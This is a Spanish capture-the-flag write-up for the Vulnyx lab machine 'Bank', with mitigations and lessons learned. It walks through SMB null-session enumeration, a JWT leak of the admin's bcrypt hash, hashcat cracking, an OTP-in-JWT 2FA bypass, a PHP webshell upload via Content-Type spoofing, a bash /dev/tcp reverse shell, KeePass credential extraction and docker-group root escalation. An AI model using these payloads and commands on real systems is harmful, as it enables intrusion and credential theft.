# Writeup: Bank (Vulnyx — Fácil)

Bank es una máquina **Fácil** que simula el entorno de una plataforma bancaria en desarrollo. El recorrido comienza con el descubrimiento de la máquina en la red local y el escaneo de puertos, que revela un servidor web Apache y un servicio SMB con acceso anónimo. A través del recurso compartido `development`, se descubre un directorio de desarrollo oculto y una nota que menciona la integración de un agente de IA y un usuario administrador en período de prueba. Accediendo al directorio de desarrollo, se encuentra un panel de login con funcionalidad de registro. Tras crear una cuenta, se identifica una fuga de información en el endpoint de verificación de destinatarios: la respuesta incluye un JWT con el hash de la contraseña del administrador. Tras crackear el hash con `hashcat`, se inicia sesión como administrador, pero el sistema activa un segundo factor de autenticación (2FA). El bypass del 2FA se logra porque el código OTP está incluido en el propio JWT. Con acceso como administrador, se habilita la funcionalidad de subida de avatar, que es vulnerable a un **bypass de validación de tipo de archivo** mediante la manipulación del `Content-Type`, permitiendo subir una webshell PHP y obtener ejecución remota de comandos como `www-data`. Finalmente, se encuentra un archivo KeePass con credenciales en `/srv/smb/passwords/`, se extraen las contraseñas de los usuarios, se accede como `marcelo` y se escala a `root` mediante el grupo `docker`.

---

## Fase 1: Descubrimiento

Realizamos un escaneo de red local con `arp-scan` para descubrir hosts activos:

```bash
sudo arp-scan -l
```

**Resultado:**

```
Interface: eth0, type: EN10MB, MAC: 08:00:27:5a:87:bc, IPv4: 192.168.1.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.4     50:bb:b5:ab:8c:0c       (Unknown)
192.168.1.8     08:00:27:cf:fb:5c       PCS Systemtechnik GmbH
192.168.1.1     10:07:1d:92:cf:98       Fiberhome Telecommunication Technologies Co.,LTD
192.168.1.2     6e:f0:a1:53:2e:37       (Unknown: locally administered)
192.168.1.5     46:ac:03:b8:b4:30       (Unknown: locally administered)
192.168.1.7     26:88:da:18:b2:a7       (Unknown: locally administered)

6 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.541 seconds (100.75 hosts/sec). 6 responded
```

La MAC `08:00:27:cf:fb:5c` corresponde a **Oracle VirtualBox**, lo que indica que `192.168.1.8` es nuestra máquina objetivo.

---

## Fase 2: Reconocimiento

Realizamos un escaneo completo de puertos con Nmap:

```bash
sudo nmap -sS --min-rate 500 -p- -Pn -n -vv 192.168.1.8 -oG allPorts
```

**Resultado:**

```
PORT    STATE SERVICE      REASON
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 08:00:27:CF:FB:5C (Oracle VirtualBox virtual NIC)
```

Realizamos un escaneo de servicios y versiones:

```bash
nmap -sCV -p 80,139,445 192.168.1.8 -oN targeted
```

**Resultados clave:**

```
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://bank.nyx/
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 08:00:27:CF:FB:5C (Oracle VirtualBox virtual NIC)
Service Info: Host: bank.nyx

Host script results:
|_nbstat: NetBIOS name: BANK, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```

**Observaciones clave:**

- **Puerto 80 (HTTP)**: Apache 2.4.66 en Debian. Redirige a `http://bank.nyx/`.
- **Puertos 139/445 (SMB)**: Samba con NetBIOS name `BANK` y dominio `bank.nyx`.
- **SMB signing no requerido**: potencial para ataques de relay, aunque no fue explotado en este caso.

Añadimos el dominio al archivo `/etc/hosts`:

```bash
echo "192.168.1.8 bank.nyx" | sudo tee -a /etc/hosts
```

Accedemos a `http://bank.nyx/` y vemos una página estática de un banco en fase de desarrollo:

> **Traditional Banking for the Digital Era.**
> Join thousands of customers who trust Bank Alpha for their financial future. Secure, reliable, and always available. Our public release is just around the corner.

---

## Fase 3: Enumeración SMB

### 3.1 Verificación de acceso anónimo

```bash
nxc smb 192.168.1.8 -u '' -p ''
```

**Resultado:**

```
SMB         192.168.1.8     445    BANK             [*] Unix - Samba (name:BANK) (domain:bank.nyx) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         192.168.1.8     445    BANK             [+] bank.nyx\:
```

**Hallazgo:** El servidor SMB permite **Null Authentication** (autenticación nula), es decir, podemos conectarnos sin credenciales.

### 3.2 Enumeración de recursos compartidos

```bash
nxc smb 192.168.1.8 -u '' -p '' --shares
```

**Resultado:**

```
SMB         192.168.1.8     445    BANK             [*] Unix - Samba (name:BANK) (domain:bank.nyx) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         192.168.1.8     445    BANK             [+] bank.nyx\:
SMB         192.168.1.8     445    BANK             [*] Enumerated shares
SMB         192.168.1.8     445    BANK             Share           Permissions     Remark
SMB         192.168.1.8     445    BANK             -----           -----------     ------
SMB         192.168.1.8     445    BANK             development     READ
SMB         192.168.1.8     445    BANK             print$                          Printer Drivers
SMB         192.168.1.8     445    BANK             IPC$                            IPC Service (Samba 4.22.8-Debian-4.22.8+dfsg-0+deb13u1)
SMB         192.168.1.8     445    BANK             nobody                          Home Directories
```

**Hallazgo crítico:** Existe un recurso compartido llamado **`development`** con permisos de **READ** para usuarios anónimos.

### 3.3 Conexión y enumeración del recurso `development`

```bash
smbclient //192.168.1.8/development -N
```

**Resultado:**

```
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun May  3 06:43:20 2026
  ..                                  D        0  Sun May  3 06:43:20 2026
  03-may-26.txt                       N     1141  Sun May  3 06:43:20 2026

                9627844 blocks of size 1024. 6245400 blocks available
smb: \> get 03-may-26.txt
getting file \03-may-26.txt of size 1141 as 03-may-26.txt (6.6 KiloBytes/sec) (average 6.6 KiloBytes/sec)
```

**Explicación:** Nos conectamos al recurso `development` con autenticación anónima (`-N`) y descargamos el archivo `03-may-26.txt`.

**Contenido del archivo:**

```
Subject: AI Agent Integration & Development Environment Setup

To streamline and accelerate the development of the banking platform, we have decided to integrate a subscription-based AI agent into our workflow. 
The service has proven to be cost-effective; however, please be aware that the AI may occasionally produce incorrect or unexpected outputs. 
For this reason, it is important to maintain strict attention to security and validate all critical operations.

A dedicated development directory has been enabled where developers can access and test the application.
Dir: development-0119-d5e051a-9da2-12sdas1-775-e0174

Additionally, the system administrator user called Juan, hired by Lucas in recent days, is currently on a probationary training period within the company. 
He will be responsible for completing the configuration of the SMB service. While the service is already installed, some final setup steps are 
still pending. Please note that he is still gaining experience, so we kindly ask for patience and encourage collaboration and assistance if needed 
to ensure everything is properly configured.

Best regards,
Marcelo
```

**Hallazgos críticos:**

1. **Directorio de desarrollo oculto**: `development-0119-d5e051a-9da2-12sdas1-775-e0174` — este es el directorio donde se aloja la aplicación web en desarrollo.
2. **Integración de un agente de IA**: El equipo usa un agente de IA que "puede producir resultados incorrectos o inesperados". Esta es una **pista sobre la presencia de vulnerabilidades introducidas por IA**.
3. **Usuario administrador en prácticas**: `Juan`, contratado por `Lucas`, está en período de prueba y es responsable de la configuración del servicio SMB. Su inexperiencia sugiere **malas configuraciones**.
4. **Autor del correo**: `Marcelo` — un usuario del equipo.

---

## Fase 4: Descubrimiento de la aplicación web

### 4.1 Acceso al directorio de desarrollo

Accedemos al directorio descubierto:

```
http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/
```

Encontramos un **panel de login** con funcionalidad de **registro**. Nos registramos con el usuario `kali` y accedemos al dashboard.

### 4.2 Exploración del dashboard

El dashboard tiene las siguientes funcionalidades:

- **Enviar dinero** a un usuario específico.
- **Verificar usuario** (para confirmar si un destinatario existe).
- **Perfil de usuario**.

En el perfil encontramos:

```
User Information

|   |   |
|---|---|
|Customer ID:|#10|
|Username:|kali|
|Account Type:|Standard|
|Current Balance:|$499.98|
```

**Observaciones:**

- El usuario `kali` tiene el **Customer ID #10** y es de tipo **Standard** (no administrador).
- El saldo es **$499.98**.

También hay una nota sobre 2FA:

> **Two-Factor Auth (2FA)**  
> The OTP security system is reserved for administrative accounts. **Coming soon for standard users.**

**Hallazgo:** Los usuarios **administradores** tienen 2FA habilitado, pero los usuarios estándar no. Esto sugiere que el 2FA es una capa de seguridad que deberemos superar si queremos acceder como administrador.

También hay una funcionalidad de subida de foto de perfil, pero:

> Profile picture changes are not available for your account type.

**Hallazgo:** La subida de imágenes **solo está disponible para administradores**. Esto es una pista de que el vector de ataque involucra obtener acceso como administrador.

### 4.3 Descubrimiento del directorio `uploads`

Mientras enumeramos la aplicación con Burp Suite, encontramos la siguiente ruta:

```
GET /development-0119-d5e051a-9da2-12sdas1-775-e0174/uploads/
```

**Hallazgo:** Existe un directorio `/uploads/` donde se almacenan las imágenes de perfil. Como el directorio es accesible directamente, si podemos subir un archivo malicioso, podremos ejecutarlo.

---

## Fase 5: Análisis del JWT

### 5.1 Captura del JWT

En la petición del perfil, observamos una cookie llamada `auth_token` que contiene un **JWT** (JSON Web Token):

```
Cookie: PHPSESSID=8adafe3cbb465cebd18ae922ebb8a48a; auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMCwidXNlcm5hbWUiOiJrYWxpIiwiaXNfYWRtaW4iOjAsImV4cCI6MTc5MzMwMDY2NCwib3RwX3ZlcmlmaWVkIjp0cnVlfQ.ZlxqApNUNdzrV1M9DcnfCUwyiVZmI2LYrNA3eYHtqB8
```

### 5.2 Decodificación del JWT

Decodificamos el JWT (las tres partes separadas por puntos: header, payload, signature):

**Header:**

```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

**Payload:**

```json
{
  "user_id": 10,
  "username": "kali",
  "is_admin": 0,
  "exp": 1793300664,
  "otp_verified": true
}
```

**Análisis:**

- **`user_id: 10`**: Nuestro ID de usuario.
- **`username: kali`**: Nuestro nombre de usuario.
- **`is_admin: 0`**: **No somos administradores**.
- **`otp_verified: true`**: El campo indica que hemos verificado el OTP. En nuestro caso, como usuario estándar, no hemos pasado por el 2FA, pero el campo está en `true` por defecto.
- **`exp`**: Fecha de expiración del token (Unix timestamp).

**El problema:** El JWT es **firmado** con HS256, lo que significa que la firma se genera con una clave secreta. Si no conocemos la clave secreta, **no podemos modificar el payload sin invalidar la firma**.

**Verificación:** Probamos si el JWT es vulnerable a ataques comunes:

- **Alg: none**: No funciona, el servidor verifica la firma.
- **Clave secreta débil**: No encontramos la clave con `hashcat` (no la intentamos en este writeup pero no es necesario porque hay otro camino).
- **JWT confusion**: No aplica (solo hay HS256).

**Conclusión:** El JWT no es vulnerable directamente. El vector de ataque será **obtener las credenciales del administrador** para iniciar sesión legítimamente.

---

## Fase 6: Fuga de información en la verificación de destinatarios

### 6.1 Envío de una petición de verificación

En el dashboard, la funcionalidad **"Verify recipient"** envía una petición para comprobar si un usuario existe. Capturamos la petición con Burp Suite:

```http
POST /development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php?page=dashboard HTTP/1.1
Host: bank.nyx
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: http://bank.nyx
Connection: keep-alive
Referer: http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php?page=dashboard
Cookie: PHPSESSID=8adafe3cbb465cebd18ae922ebb8a48a; auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
Upgrade-Insecure-Requests: 1
Priority: u=0, i

to_username=admin&verify_recipient=&amount=&description=
```

**Explicación:** Enviamos `to_username=admin` y el campo `verify_recipient` (vacío pero presente) para activar la verificación del destinatario `admin`.

### 6.2 Respuesta con fuga de información

**Respuesta:**

```http
HTTP/1.1 200 OK
Date: Thu, 29 Oct 2026 18:40:59 GMT
Server: Apache/2.4.66 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-Recipient-Metadata: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiJDJ5JDEyJFg0dXBwUXZ6d0ZDU2JWZkNIN3FGMWVOT1NBNlwvY0J5XC9vNXNiVmN4eGRmdVwvR0Y3LmEwWUtpIiwiYmFsYW5jZSI6IjEwMDAwMDAuMDEiLCJpc19hZG1pbiI6MSwidXNlX290cCI6MSwiY3JlYXRlZF9hdCI6IjIwMjYtMDUtMDIgMTM6MjQ6MTMifQ.TSg0G-kQbopBnG6q_qm16bIYU9R7Ts9ERfuWHKYwRm0
Vary: Accept-Encoding
Content-Length: 5925
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

**Hallazgo crítico:** La respuesta incluye una cabecera **`X-Recipient-Metadata`** que contiene un **JWT con información del destinatario**, incluyendo su **hash de contraseña**.

### 6.3 Decodificación del JWT del destinatario

Decodificamos el JWT:

**Payload:**

```json
{
  "id": 1,
  "username": "admin",
  "password": "$2y$12$X4uppQvzwFCSbVfCH7qF1eNOSA6/cBy/o5sbVcxxdfu/GF7.a0YKi",
  "balance": "1000000.01",
  "is_admin": 1,
  "use_otp": 1,
  "created_at": "2026-05-02 13:24:13"
}
```

**Análisis de la vulnerabilidad:**

- **`password`**: El hash de la contraseña del administrador está expuesto.
- **`is_admin: 1`**: Confirma que `admin` es administrador.
- **`use_otp: 1`**: Confirma que el administrador usa 2FA.

**La causa raíz:** El endpoint `verify_recipient` devuelve los metadatos del destinatario (incluyendo el hash de la contraseña) en una cabecera HTTP **`X-Recipient-Metadata`**. Esto es una vulnerabilidad de **exposición de información sensible** (CWE-200). El servidor debería devolver únicamente el nombre del destinatario y su estado (existe/no existe), no el objeto completo del usuario.

---

## Fase 7: Crackeo del hash bcrypt

### 7.1 Identificación del tipo de hash

El hash es `$2y$12$X4uppQvzwFCSbVfCH7qF1eNOSA6/cBy/o5sbVcxxdfu/GF7.a0YKi`.

**Análisis:**

- **`$2y$`**: Prefijo de **bcrypt** (variante de PHP, equivalente a `$2a$` y `$2b$`).
- **`12`**: Factor de coste (2^12 = 4096 iteraciones). Un coste de 12 es lento pero no imposible de crackear.

### 7.2 Crackeo con hashcat

```bash
hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

**Explicación de parámetros:**

- `-a 0`: Ataque de diccionario (straight).
- `-m 3200`: Modo de hash bcrypt (`$2*$` Blowfish (Unix)).
- `hash.txt`: Archivo con el hash.
- `/usr/share/wordlists/rockyou.txt`: Diccionario de contraseñas.

**Resultado:**

```
$2y$12$X4uppQvzwFCSbVfCH7qF1eNOSA6/cBy/o5sbVcxxdfu/GF7.a0YKi:blink182
```

**Hallazgo crítico:** La contraseña del administrador es **`blink182`**. Es una contraseña débil, basada en el nombre de una banda de rock, que está en `rockyou.txt`.

**Análisis:** El uso de bcrypt con coste 12 es una buena práctica, pero la contraseña es débil y está en un diccionario público. Las contraseñas deben ser largas, aleatorias y no basadas en palabras comunes.

---

## Fase 8: Bypass del 2FA mediante JWT

### 8.1 Inicio de sesión como administrador

Con las credenciales `admin:blink182`, iniciamos sesión:

```http
POST /development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php HTTP/1.1
Host: bank.nyx
...
Cookie: PHPSESSID=8adafe3cbb465cebd18ae922ebb8a48a

username=admin&password=blink182&login=
```

**Resultado:** La aplicación redirige a la página de **verificación OTP**:

```http
POST /development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php HTTP/1.1
Host: bank.nyx
...
Cookie: PHPSESSID=8adafe3cbb465cebd18ae922ebb8a48a; auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImV4cCI6MTc5MzMwMjk2Niwib3RwIjo5MjUxOTAsImF0dGVtcHRzIjozLCJvdHBfdmVyaWZpZWQiOmZhbHNlfQ.iQwddpIlLWpWfJQgcfcQN6rK22xSaRkYBwNJs5gHLLw

otp=11111111&verify_otp=
```

**Observación:** El nuevo JWT incluye el campo `otp` con el valor `925190`.

### 8.2 Decodificación del nuevo JWT

**Payload:**

```json
{
  "user_id": 1,
  "username": "admin",
  "is_admin": 1,
  "exp": 1793302966,
  "otp": 925190,
  "attempts": 3,
  "otp_verified": false
}
```

**Hallazgo crítico:** El **código OTP** (`925190`) está **incluido en el propio JWT**. Esto es una vulnerabilidad de diseño grave: el OTP está diseñado para ser un secreto que solo el usuario legítimo conoce (a través de su aplicación de autenticación o correo electrónico). Al incluirlo en el JWT, **cualquier persona con acceso al JWT puede leer el OTP y verificarlo**.

### 8.3 Intento fallido de fuerza bruta

Primero probamos a fuerza bruta el OTP:

```http
otp=1234&verify_otp=
```

**Resultado:** Tras tres intentos fallidos, la aplicación redirige al login.

**Análisis:** El sistema tiene un límite de **3 intentos** (`attempts: 3` en el JWT), lo que hace inviable la fuerza bruta (el espacio de OTP es de 6 dígitos = 1.000.000 de combinaciones).

### 8.4 Bypass exitoso

Como el OTP está en el JWT, simplemente lo leemos y lo enviamos:

```http
POST /development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php HTTP/1.1
Host: bank.nyx
...
Cookie: PHPSESSID=...; auth_token=... (JWT con otp: 658963)

otp=658963&verify_otp=
```

**Resultado:** ¡Autenticación exitosa como administrador!

**Análisis de la vulnerabilidad:**

- El OTP es un factor de seguridad que **no debe ser accesible desde el cliente**.
- Al incluir el OTP en el JWT (que es legible por el cliente), el 2FA se vuelve **completamente inútil**.
- **Causa raíz:** El JWT contiene información sensible (`otp`, `password` en el otro JWT) que no debería estar expuesta.

**Mitigación:** El OTP debe almacenarse en el servidor (base de datos o sesión) y **nunca** enviarse al cliente. El JWT solo debe contener el `user_id`, `username` y `is_admin`.

---

## Fase 9: Subida de archivos maliciosos

### 9.1 Acceso a la funcionalidad de subida

Como administrador, ahora tenemos acceso a la funcionalidad de **cambio de foto de perfil**. El formulario permite subir archivos.

### 9.2 Intento de subida de una webshell PHP

Creamos una webshell PHP:

```bash
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

Subimos el archivo como `shell.php` con `Content-Type: application/x-php`:

```http
POST /development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php?page=profile HTTP/1.1
Host: bank.nyx
...
Content-Type: multipart/form-data; boundary=----geckoformboundaryb7a69e3d15728fc48dd2ab91069f69e5

------geckoformboundaryb7a69e3d15728fc48dd2ab91069f69e5
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>

------geckoformboundaryb7a69e3d15728fc48dd2ab91069f69e5
Content-Disposition: form-data; name="upload_avatar"


------geckoformboundaryb7a69e3d15728fc48dd2ab91069f69e5--
```

**Resultado:**

```html
<div class="bg-red-50 border border-red-200 text-red-600 p-3 rounded mb-6 text-sm">
            <strong>Error:</strong> Invalid file type. Only JPG, PNG and GIF are allowed.        </div>
```

**Análisis:** El servidor valida el **Content-Type** del archivo y solo permite `image/jpeg`, `image/png` e `image/gif`.

### 9.3 Bypass de la validación por Content-Type

Modificamos el `Content-Type` del archivo a `image/png`:

```http
------geckoformboundaryb7a69e3d15728fc48dd2ab91069f69e5
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
```

**Resultado:** La subida devuelve un **error 500**, pero el archivo se guarda en el servidor.

**Análisis de la vulnerabilidad:**

- El servidor **solo valida el `Content-Type`** enviado por el cliente, que es **trivialmente falsificable**.
- **No valida la extensión** del archivo (o si lo hace, no bloquea `.php`).
- **No valida el contenido** (magic bytes, estructura del archivo).
- El archivo se guarda en el directorio `/uploads/`, que es **accesible desde la web**.

**Mitigación:** La validación debe ser:

1. **Validar la extensión** contra una lista blanca (`.jpg`, `.png`, `.gif`).
2. **Validar el tipo MIME real** (magic bytes) usando `finfo_file()` en PHP.
3. **Renombrar el archivo** a un nombre aleatorio sin extensión ejecutable.
4. **Almacenar fuera del webroot** o en un directorio con `php_flag engine off`.
5. **Usar `Content-Disposition: attachment`** para forzar la descarga.

### 9.4 Verificación de la webshell

Tenemos ejecución de comandos:

```bash
curl -s "http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/uploads/shell.php?cmd=id"
```

**Resultado:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Fase 10: Ejecución remota de comandos y reverse shell

### 10.1 Reverse shell

```bash
curl -s -G "http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/uploads/shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.10/443 0>&1'"
```

**Resultado:**

```bash
nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.1.10] from (UNKNOWN) [192.168.1.8] XXXXX
www-data@bank:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Obtenemos una shell como **`www-data`**.

---

## Fase 11: Extracción de credenciales del KeePass

### 11.1 Enumeración del sistema

```bash
www-data@bank:/$ ls /srv
smb
```

**Hallazgo:** Existe un directorio `/srv/smb/` con contenido relacionado con Samba.

```bash
www-data@bank:/$ ls /srv/smb/
passwords/ share/
```

```bash
www-data@bank:/$ ls /srv/smb/passwords/
note.txt  passwords.kdbx
```

**Hallazgo crítico:** Hay una **base de datos KeePass** (`passwords.kdbx`) y una nota (`note.txt`).

### 11.2 Lectura de la nota

```bash
www-data@bank:/$ cat /srv/smb/passwords/note.txt
```

**Resultado:**

```
Hey, as you said Marcelo, I've already left a KeePass file with all the system passwords you asked me to create, except for the root password. 
The KeePass password is: `@zm{2h8aUu'a_M;'Jd:!MAQ?zn

Delete it after reading, but don't worry—I think I've configured this directory properly so only you can access 
it, and it's not exposed on the SMB service either.

— Juan
```

**Análisis de la vulnerabilidad:**

- La **contraseña maestra del KeePass** está en texto plano en la nota.
- La nota dice que el directorio "no está expuesto en SMB", pero **sí está accesible desde el sistema de archivos**.
- **Juan** (el administrador en prácticas) dejó la contraseña en un archivo de texto, lo que es una mala práctica crítica.

### 11.3 Extracción de credenciales del KeePass

Identificamos el archivo:

```bash
file passwords.kdbx
```

**Resultado:**

```
passwords.kdbx: Keepass password database 2.x KDBX
```

Abrimos la base de datos con `keepassxc` usando la contraseña maestra:

```bash
keepassxc passwords.kdbx
```

**Resultado:**

```
juan:j2uan#21eIlLo!76
lucas:lUc4s!62edfgl0o6
marcelo:m4rC1!#asl2#vsHj4!
```

**Hallazgo crítico:** Obtenemos las credenciales de tres usuarios:

- **`juan`**: `j2uan#21eIlLo!76`
- **`lucas`**: `lUc4s!62edfgl0o6`
- **`marcelo`**: `m4rC1!#asl2#vsHj4!`

---

## Fase 12: Acceso como `marcelo`

### 12.1 Cambio de usuario

Como `marcelo` es el autor del correo y probablemente tiene más privilegios, probamos con sus credenciales:

```bash
juan@bank:/$ su marcelo
Password: 
marcelo@bank:/$ id
uid=1000(marcelo) gid=1000(marcelo) groups=1000(marcelo),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),105(docker)
```

**Hallazgo crítico:** `marcelo` pertenece al grupo **`docker`** (GID 105). Esto es una vulnerabilidad grave de escalada de privilegios.

### 12.2 Obtención de la flag de usuario

```bash
marcelo@bank:/$ ls -la /home/marcelo
```

**Resultado:**

```
total 28
drwx------ 3 marcelo marcelo 4096 May  5 11:07 .
drwxr-xr-x 5 root    root    4096 May  3 07:30 ..
lrwxrwxrwx 1 root    root       9 May  3 07:29 .bash_history -> /dev/null
-rw-r--r-- 1 marcelo marcelo  220 May  1 07:37 .bash_logout
-rw-r--r-- 1 marcelo marcelo 3526 May  1 07:37 .bashrc
drwxrwxr-x 3 marcelo marcelo 4096 May  3 06:13 .local
lrwxrwxrwx 1 root    root       9 May  3 07:29 .mysql_history -> /dev/null
-rw-r--r-- 1 marcelo marcelo  807 May  1 07:37 .profile
lrwxrwxrwx 1 root    root       9 May  5 11:07 .sqlite_history -> /dev/null
-rw-rw-r-- 1 marcelo marcelo   33 May  3 07:02 user.txt
```

**Hallazgo:** Encontramos `user.txt` en el home de `marcelo`.

---

## Fase 13: Escalada a root mediante el grupo `docker`

### 13.1 Enumeración de contenedores Docker

```bash
marcelo@bank:/$ docker ps
```

**Resultado:**

```
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
```

**Análisis:** No hay contenedores en ejecución, pero el daemon de Docker está activo.

### 13.2 Escalada a root

El grupo `docker` permite comunicarse con el daemon de Docker, que se ejecuta como `root`. Podemos lanzar un contenedor con el sistema de archivos del host montado y acceder a él como `root`:

```bash
marcelo@bank:/$ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

**Explicación del comando:**

- `docker run`: Ejecuta un contenedor.
- `-v /:/mnt`: Monta el sistema de archivos del host (`/`) en `/mnt` dentro del contenedor.
- `--rm`: Elimina el contenedor al salir.
- `-it`: Modo interactivo con TTY.
- `alpine`: Imagen base (ligera).
- `chroot /mnt /bin/sh`: Cambia la raíz del sistema de archivos a `/mnt` (el host) y ejecuta `sh`.

**Resultado:**

```
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
7b229517ed22: Pull complete 
Digest: sha256:be2656061b536c1883c4034790e21d0a09c5aaaf51968b89368a3c0371ea2c9a
Status: Downloaded newer image for alpine:latest
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

**Hallazgo crítico:** Somos **`root`** dentro del contenedor, y como el sistema de archivos del host está montado en `/mnt`, tenemos acceso completo al host.

### 13.3 Lectura de la flag de root

```bash
# ls /root
root.txt
```

Obtenemos la **flag de root**.

---

## 📌 Conclusión

Bank es una máquina **Fácil** que combina:

1. **Enumeración SMB** con autenticación nula y recurso compartido `development`.
2. **Descubrimiento de un directorio de desarrollo** y una nota con información sensible.
3. **Fuga de información** en el endpoint `verify_recipient` (hash de contraseña del admin en una cabecera HTTP).
4. **Crackeo de hash bcrypt** con `hashcat`.
5. **Bypass del 2FA** porque el OTP está incluido en el JWT.
6. **Bypass de validación de subida de archivos** mediante el `Content-Type`.
7. **Ejecución remota de comandos** mediante una webshell PHP.
8. **Extracción de credenciales** de un archivo KeePass con contraseña maestra en texto plano.
9. **Escalada a `root`** mediante el grupo `docker`.

---

## 📚 Lecciones aprendidas

1. **La autenticación nula en SMB es un riesgo crítico**  
   El servidor SMB permitía conexiones anónimas y exponía el recurso `development` con información sensible (directorio de desarrollo, usuarios, configuración pendiente). SMB debe requerir autenticación y los recursos compartidos deben tener permisos mínimos.

2. **No se debe devolver información sensible en cabeceras HTTP**  
   El endpoint `verify_recipient` devolvía el objeto completo del usuario (incluyendo el hash de la contraseña) en la cabecera `X-Recipient-Metadata`. Los endpoints de verificación deben devolver únicamente el estado (existe/no existe), nunca el objeto completo.

3. **Los hashes bcrypt son seguros, pero las contraseñas débiles no**  
   El hash bcrypt con coste 12 es resistente a ataques de fuerza bruta, pero la contraseña `blink182` está en `rockyou.txt`. Las contraseñas deben ser largas, aleatorias y no basadas en palabras comunes.

4. **El 2FA es inútil si el OTP está en el JWT**  
   El código OTP se incluía en el JWT, que es legible por el cliente. El OTP debe almacenarse en el servidor (sesión o base de datos) y nunca enviarse al cliente. El JWT solo debe contener el `user_id`, `username` y `is_admin`.

5. **La validación de subida de archivos debe ser robusta**  
   El servidor solo validaba el `Content-Type`, que es trivialmente falsificable. La validación debe incluir: extensión (lista blanca), tipo MIME real (magic bytes), renombrado del archivo, almacenamiento fuera del webroot y deshabilitación de la ejecución de PHP en el directorio de uploads.

6. **Los archivos KeePass deben protegerse adecuadamente**  
   La contraseña maestra del KeePass estaba en texto plano en una nota adyacente, y el archivo estaba accesible desde el sistema de archivos. Los archivos KeePass deben almacenarse en ubicaciones con permisos restrictivos y la contraseña maestra no debe almacenarse junto al archivo.

7. **El grupo `docker` es equivalente a `root`**  
   Cualquier usuario en el grupo `docker` puede lanzar contenedores con el sistema de archivos del host montado y acceder a él como `root`. La pertenencia al grupo `docker` debe tratarse con el mismo nivel de privilegio que `root`.

8. **La integración de IA puede introducir vulnerabilidades**  
   La nota del SMB menciona que el equipo integra un agente de IA que "puede producir resultados incorrectos o inesperados". Esto es una pista de que las vulnerabilidades pueden ser el resultado de código generado por IA sin la debida revisión. La revisión de seguridad del código generado por IA es esencial.

9. **Los administradores en prácticas pueden introducir malas configuraciones**  
   Juan, el administrador en prácticas, dejó la contraseña del KeePass en texto plano y configuró mal los permisos del SMB. La formación y supervisión de nuevos administradores es fundamental.
